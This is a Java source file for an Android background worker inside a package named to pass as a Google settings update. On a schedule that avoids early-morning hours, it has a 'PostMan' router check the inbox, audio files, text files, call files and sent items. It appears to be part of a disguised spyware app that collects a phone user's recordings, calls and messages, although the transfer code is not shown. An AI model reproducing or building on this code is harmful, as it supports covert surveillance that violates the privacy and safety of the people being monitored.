package com.setting.dl.google.googlesettingupdate;

import android.content.Context;
import android.content.SharedPreferences;
import android.support.annotation.NonNull;

import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.IPostMan;

import java.util.Date;

public class OnlineWorks extends Worker {
   
   private static final Object OBJECT = new Object();
   
   public OnlineWorks(@NonNull Context context, @NonNull WorkerParameters workerParams) {
      super(context, workerParams);
   }
   
   @NonNull
   @Override
   public Result doWork() {
   
      synchronized (OBJECT) {
   
         if (isWrongTime()) {
   
            return Result.success();
         }
      }
   
      IPostMan router = PostMan.getInstance(getApplicationContext());
   
      router.checkInbox();
      router.checkAudioFiles();
      router.checkTextFiles();
      router.checkCallFiles();
      router.checkSent();
      
      return Result.success();
   }
   
   private boolean isWrongTime() {
      
      SharedPreferences pref         = getApplicationContext().getSharedPreferences("works", Context.MODE_PRIVATE);
      long              now          = System.currentTimeMillis();
      long              lastWorkTime = pref.getLong("lastWork", 1L);
      
      if ((now - lastWorkTime) < 60000L) {
         
         u.log.d("Görev zaten yapıldı");
         return true;
      }
      
      pref.edit().putLong("lastWork", now).apply();
   
   
      int hour = Integer.valueOf(u.format("%tH", new Date()));
   
      switch (hour) {
      
         case 3:
         case 4:
         case 5:
         case 6:
         case 7:
         
            u.log.d("Uygun bir saat değil : %d", hour);
            return true;
      }
      
      
      
      return false;
   }
   
   
   
   
}
